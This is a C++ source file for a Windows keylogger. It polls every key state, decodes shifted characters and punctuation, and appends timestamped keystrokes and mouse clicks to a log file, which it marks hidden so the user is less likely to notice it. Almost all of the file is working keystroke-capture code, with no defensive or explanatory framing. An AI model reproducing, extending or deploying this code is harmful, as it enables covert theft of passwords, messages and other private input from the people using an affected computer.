#include "KeyLogger.hpp"
#include <iostream>
#include <thread> // For sleep
#include <windows.h> // Key press detection on windows
#include <ctime> // For time
#include <iomanip> // For time

KeyLogger::KeyLogger(const std::string& filePath) : logFile(filePath)
{
    // Open the logging file
    loggingFile.open(logFile, std::ios::app);
    if(loggingFile.is_open())
    {
        // Create the hidden file
        makeFileHidden();
    }
    else
    {
        std::cerr << "Error opening log file" << std::endl;
    }
}

KeyLogger::~KeyLogger()
{
    // Close the file
    if(loggingFile.is_open())
    {
        loggingFile.close();
    }
}

void KeyLogger::makeFileHidden()
{
    // Convert std::string to std::wstring 
    std::wstring wideLogFile(logFile.begin(), logFile.end());
    
    // Set the file to hidden
    DWORD at = GetFileAttributesW(wideLogFile.c_str());
    if(at != INVALID_FILE_ATTRIBUTES && !(at & FILE_ATTRIBUTE_DIRECTORY))
    {
        // Make hidden
        SetFileAttributesW(wideLogFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
}

void KeyLogger::logKey(int key)
{
    // Get time and duration
    auto lastPressTime = lastKeyPress[key];
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(lastPressTime.time_since_epoch()).count();
    auto now = std::chrono::system_clock::now();
    auto nowTimeT = std::chrono::system_clock::to_time_t(now);
    auto nowMs = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;

    // Format the time 
    std::ostringstream timestamp;
    timestamp << std::put_time(std::localtime(&nowTimeT), "%Y-%m-%d %H:%M:%S")
              << '.' << std::setfill('0') << std::setw(3) << nowMs.count();

    std::string keyString;

    // Check for uppercase or lowercase
    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool isUppercase = shiftPressed ^ capsLockOn; // XOR because they invert each other

    // Handle printable characters
    if (key > 32 && key <= 126)
    {
        if (std::isalpha(key)) // Alphabet characters
        {
            keyString = isUppercase ? std::toupper(static_cast<char>(key)) : std::tolower(static_cast<char>(key));
        }
        else if (std::isdigit(key)) // Digits with possible shift modifications
        {
            if (isUppercase)
            {
                std::string special = "!@#$%^&*()";
                keyString = (key - '0' == 0) ? special[9] : special[(key - '0') - 1];
            }
            else
            {
                keyString = static_cast<char>(key);
            }
        }
        else // Other printable characters
        {
            keyString = static_cast<char>(key);
        }
    }
    else
    {
        // Handle special keys and punctuation with a switch statement
        switch (key)
        {
        case VK_OEM_COMMA:
            keyString = isUppercase ? "<" : ",";
            break;
        case VK_OEM_PERIOD:
            keyString = isUppercase ? ">" : ".";
            break;
        case VK_OEM_MINUS:
            keyString = isUppercase ? "_" : "-";
            break;
        case VK_OEM_PLUS:
            keyString = isUppercase ? "+" : "=";
            break;
        case VK_OEM_1: 
            keyString = isUppercase ? ":" : ";";
            break;
        case VK_OEM_2: 
            keyString = isUppercase ? "?" : "/";
            break;
        case VK_OEM_3: 
            keyString = isUppercase ? "~" : "`";
            break;
        case VK_OEM_4:
            keyString = isUppercase ? "{" : "[";
            break;
        case VK_OEM_5: 
            keyString = isUppercase ? "|" : "\\";
            break;
        case VK_OEM_6: 
            keyString = isUppercase ? "}" : "]";
            break;
        case VK_OEM_7: 
            keyString = isUppercase ? "\"" : "'";
            break;
        case VK_SPACE:
            keyString = "[SPACE]";
            break;
        case VK_BACK:
            keyString = "[BACKSPACE]";
            break;
        case VK_SHIFT:
            keyString = "[SHIFT]";
            break;
        case 1: 
            keyString = "[MOUSE1]";
            break;
        case 2: 
            keyString = "[MOUSE2]";
            break;
        }
    }

    // Log the key
    if (loggingFile.is_open())
    {
        if (!keyString.empty()) // Check for non-empty keys
        {
            loggingFile << timestamp.str() << "     " << keyString << std::endl;
        }
    }
    else
    {
        std::cerr << "Logging file isn't open" << std::endl;
    }
}



void KeyLogger::run()
{
    while(true)
    {
        for(int key = 0; key <= 256; key++)
        {
            if(GetAsyncKeyState(key) & 0x8000) // If The key is pressed
            {
                // Get current time
                auto now = std::chrono::steady_clock::now();

                // If the key is not in lastKeyPress map log it
                if(lastKeyPress.find(key) == lastKeyPress.end())
                {
                    lastKeyPress[key] = now;
                    logKey(key); // Log key press
                }
                else
                {
                    // Calculate time diff between presses
                    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - lastKeyPress[key]);

                    if(duration.count() > 200)
                    {
                        // Enough time has passed we can assume that its another press
                        lastKeyPress[key] = now;
                        logKey(key); // Log key press
                    }

                }
            }
            else
            {
                // If the key is released
                if(lastKeyPress.find(key) != lastKeyPress.end())
                {
                    lastKeyPress.erase(key);
                }
            }
        }
        // Small delay
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}